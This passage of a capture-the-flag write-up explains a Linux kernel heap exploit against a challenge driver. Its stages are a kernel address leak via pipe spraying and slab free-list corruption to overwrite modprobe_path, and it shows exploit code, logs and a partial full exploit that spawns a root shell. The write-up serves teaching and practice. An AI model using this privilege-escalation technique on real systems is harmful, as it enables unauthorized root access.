+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">delete</span>(fd, i) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_delete</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">print</span>(fd, i, <span style="color:#ae81ff">0x400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x400</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(buf[j] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print_arr</span>(<span style="color:#f92672">&amp;</span>buf[j], <span style="color:#ae81ff">0x40</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x8</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>With that we just print anything what is not NULL. Surprisingly, we got uncompressed kheap pointers, despite the fairly new kernel version:</p>
+<pre tabindex="0"><code>0x0: 0xffff9cdc81b12800
+0x8: 0x0
+0x10: 0x0
+0x18: 0x0
+0x20: 0x0
+0x28: 0x0
+0x30: 0x0
+0x38: 0x0
+0x0: 0xffff9cdc81b12400
+0x8: 0x0
+0x10: 0x0
+0x18: 0x0
+0x20: 0x0
+0x28: 0x0
+0x30: 0x0
+0x38: 0x0
+</code></pre><p>Since these are uncompressed, we would assume that the kheap doesn&rsquo;t use a lot of mitigations. Because of that, it is worth trying to change this pointer, which points to the next free chunk, to point to a different location. This could allow for an arbitrary allocation in R/W memory.</p>
+<h3 id="getting-a-kernel-text-leak">Getting a kernel .text leak<a hidden class="anchor" aria-hidden="true" href="#getting-a-kernel-text-leak">#</a></h3>
+<p>To be able to turn an arbitrary allocation/write into something useful, we need a KASLR leak (this way we can tamper with <code>modprobe_path</code>). For the leak, we sprayed a ton of pipes, hoping to get a <code>pipe_buffer</code> struct allocated in place of our freed chunks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> pipe_buffer {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> page <span style="color:#f92672">*</span>page;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> offset, len;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pipe_buf_operations <span style="color:#f92672">*</span>ops;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> flags;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> private;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>This structure contains a <code>pipe_buf_operations</code> member, which is an address at a constant offset to the kernel base.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/greynote&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">alloc</span>(fd, i) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_alloc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">delete</span>(fd, i) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_delete</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> pipefds[<span style="color:#ae81ff">0x100</span>][<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x10000</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buf1, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x10000</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x100</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">init_pipe</span>(pipefds[i]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(pipefds[i][<span style="color:#ae81ff">1</span>], buf1, <span style="color:#ae81ff">0x10000</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kleak <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">print</span>(fd, i, <span style="color:#ae81ff">0x400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x400</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(buf[j] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xffffffff00000000</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print_arr</span>(<span style="color:#f92672">&amp;</span>buf[j], <span style="color:#ae81ff">0x40</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x8</span>);
+</span></span><span style="display:flex;"><span>                kleak <span style="color:#f92672">=</span> buf[j];
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">goto</span> out1;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This yields the following output:</p>
+<pre tabindex="0"><code>0x0: 0xffffffff8c226740
+0x8: 0x10
+0x10: 0x0
+0x18: 0xffffd9aec00d10c0
+0x20: 0x100000000000
+0x28: 0xffffffff8c226740
+0x30: 0x10
+0x38: 0x0
+</code></pre><h3 id="corrupting-modprobe_path">Corrupting modprobe_path<a hidden class="anchor" aria-hidden="true" href="#corrupting-modprobe_path">#</a></h3>
+<p>Bingo! We successfully received a kernel leak. Lets try writing to <code>modprobe_path</code> by simply corrupting the uncompressed slab free-list forward pointer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kbase <span style="color:#f92672">=</span> kleak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1426740</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> modprobe_path <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1d4aec0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;base: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kbase);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;modprobe_path: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, modprobe_path);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">alloc</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_alloc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">delete</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_delete</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">print</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200</span>, <span style="color:#ae81ff">0x400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x400</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(buf[j] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print_arr</span>(<span style="color:#f92672">&amp;</span>buf[j], <span style="color:#ae81ff">0x40</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x8</span>);
+</span></span><span style="display:flex;"><span>                buf[j] <span style="color:#f92672">=</span> modprobe_path <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xc0</span>;    
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">edit</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200</span>, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)buf, <span style="color:#ae81ff">0x400</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_edit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">goto</span> out2;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>out2:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">alloc</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x400</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_alloc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>However, there appears to be a kernel panic, since Qemu simply exits without output. This happens because the chunks from this cache need to be <code>0x400</code> aligned. Aside from that, there are a lot of pointers around <code>modprobe_path</code> we end up clobbering:</p>
+<pre tabindex="0"><code>0xffffffffb734ada0|+0x0030|+006: 0xffffffffb734ad20  -&gt;  0xffffffffb734aca0  -&gt;  0xffffffffb734ac20  -&gt;  ...
+0xffffffffb734ada8|+0x0038|+007: 0xffffffffb734c4e0  -&gt;  0xffffffffb734ada0  -&gt;  0xffffffffb734ad20  -&gt;  ...
+0xffffffffb734adb0|+0x0040|+008: 0xffffffffb74a29a0  -&gt;  0xffffffffb6a15779  -&gt;  0x5f00656c75646f6d (&#39;module&#39;?)
+0xffffffffb734adb8|+0x0048|+009: 0xffffffffb74bda60  -&gt;  0xffffffffb70f8230  -&gt;  0x6c5f656c75646f6d &#39;module_load&#39;
+0xffffffffb734adc0|+0x0050|+010: 0xffffffffb723b100  -&gt;  0x0000000000000000
+0xffffffffb734adc8|+0x0058|+011: 0xffffffffb73607a0  -&gt;  0xffffffffb734adc0  -&gt;  0xffffffffb723b100  -&gt;  ...
+0xffffffffb734add0|+0x0060|+012: 0x00000000000000b2
+0xffffffffb734add8|+0x0068|+013: 0xffffffffb734ab80  -&gt;  0xffffffffb5950210  -&gt;  0xd6894855fa1e0ff3
+0xffffffffb734ade0|+0x0070|+014: 0xffffffffb734a840  -&gt;  0x2c22732520732522 &#39;&#34;%s %s&#34;, __get_str(name), __print_flags(REC-&gt;taints, &#34;&#34;, { (1UL [...]&#39;
+0xffffffffb734adf8|+0x0088|+017: 0x0000000000000008
+0xffffffffb734ae20|+0x00b0|+022: 0xffffffffb594faa0  -&gt;  0x54415541fa1e0ff3
+0xffffffffb734ae28|+0x00b8|+023: 0xffffffffb70eedd9  -&gt;  0xd00025c044fe866e
+0xffffffffb734ae30|+0x00c0|+024: 0xffffffffb594fa40  -&gt;  0x53555441fa1e0ff3
+0xffffffffb734ae38|+0x00c8|+025: 0xffffffffb70eede1  -&gt;  0x020025c04cfe8612
+0xffffffffb734ae40|+0x00d0|+026: 0xffffffffb594f9c0  -&gt;  0x53555441fa1e0ff3
+0xffffffffb734ae48|+0x00d8|+027: 0xffffffffb70eede9  -&gt;  0x400025c054fe861d
+0xffffffffb734ae50|+0x00e0|+028: 0xffffffffb594f970  -&gt;  0x8b485355fa1e0ff3
+0xffffffffb734ae58|+0x00e8|+029: 0xffffffffb70eedf9  -&gt;  0x8e0025c054fe8634
+0xffffffffb734ae60|+0x00f0|+030: 0xffffffffb594f900  -&gt;  0x8b485355fa1e0ff3
+0xffffffffb734ae68|+0x00f8|+031: 0xffffffffb70eee01  -&gt;  0x850025c05cfe8657
+0xffffffffb734ae80|+0x0110|+034: 0xffffffffb7041dfe  -&gt;  0x54002f3d454d4f48 (&#39;HOME=/&#39;?)
+0xffffffffb734ae88|+0x0118|+035: 0xffffffffb7041e05  -&gt;  0x6e696c3d4d524554 &#39;TERM=linux&#39;
+0xffffffffb734ae90|+0x0120|+036: 0xffffffffb6f7a9f8  -&gt;  0x62732f3d48544150 &#39;PATH=/sbin:/usr/sbin:/bin:/usr/bin&#39;
+0xffffffffb734aea0|+0x0130|+038: 0x0000138800000000
+0xffffffffb734aea8|+0x0138|+039: 0x000000000000000a
+0xffffffffb734aec0|+0x0150|+042: 0x6f6d2f6e6962732f &#39;/sbin/modprobe&#39;
+0xffffffffb734aec8|+0x0158|+043: 0x000065626f727064 (&#39;dprobe&#39;?)
+</code></pre><p>Restoring those pointers from the leak, and fixing the alignment finally allows write into <code>modprobe_path</code>:</p>
+<pre tabindex="0"><code>/ $ cat /proc/sys/kernel/modprobe
+/tmp/x
+</code></pre><h3 id="win">Win<a hidden class="anchor" aria-hidden="true" href="#win">#</a></h3>
+<p>Running the full exploit successfully grants access to the flag:</p>
+<pre tabindex="0"><code>/ $ exp
+0x0: 0xffffffffb6a26740
+0x8: 0x10
+0x10: 0x0
+0x18: 0xffffe372400d0bc0
+0x20: 0x100000000000
+0x28: 0xffffffffb6a26740
+0x30: 0x10
+0x38: 0x0
+base: 0xffffffffb5600000
+modprobe_path: 0xffffffffb734aec0
+0x0: 0xffffa1f04224b400
+0x8: 0x0
+0x10: 0x0
+0x18: 0x0
+0x20: 0x0
+0x28: 0x0
+0x30: 0x0
+0x38: 0x0
+grey{fake_flag_for_testing}
+</code></pre><p>The full exploit is pretty simple yet ugly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sched.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/sockios.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/if_vlan.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MODPROBE_SCRIPT &#34;#!/bin/sh\\n/bin/sh 0&lt;/proc/%u/fd/%u 1&gt;/proc/%u/fd/%u 2&gt;&amp;1\\n&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ALLOC 0x40086710
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREE 0x40086711
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define WRITE 0xC0186712
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define READ 0xC0186713
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pin_cpu</span>(<span style="color:#66d9ef">int</span> cpu) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">cpu_set_t</span> my_set;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CPU_ZERO</span>(<span style="color:#f92672">&amp;</span>my_set);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CPU_SET</span>(cpu, <span style="color:#f92672">&amp;</span>my_set);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sched_setaffinity</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(my_set), <span style="color:#f92672">&amp;</span>my_set);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">alloc</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">int</span> idx) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ioctl</span>(fd, ALLOC, idx);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">delete</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">int</span> idx) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ioctl</span>(fd, FREE, idx);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> req {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">edit</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">int</span> idx, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">int</span> size) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> req <span style="color:#f92672">*</span>req <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> req));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    req<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)idx;
+</span></span><span style="display:flex;"><span>    req<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)size;
+</span></span><span style="display:flex;"><span>    req<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">=</span> data;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioctl</span>(fd, WRITE, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)req);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(req);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">print</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">int</span> idx, <span style="color:#66d9ef">int</span> size) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> req <span style="color:#f92672">*</span>req <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> req));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    req<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)idx;
+</span></span><span style="display:flex;"><span>    req<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)size;
+</span></span><span style="display:flex;"><span>    req<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">1</span>, size <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">ioctl</span>(fd, READ, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)req) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_print</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ret <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>data;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(req);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
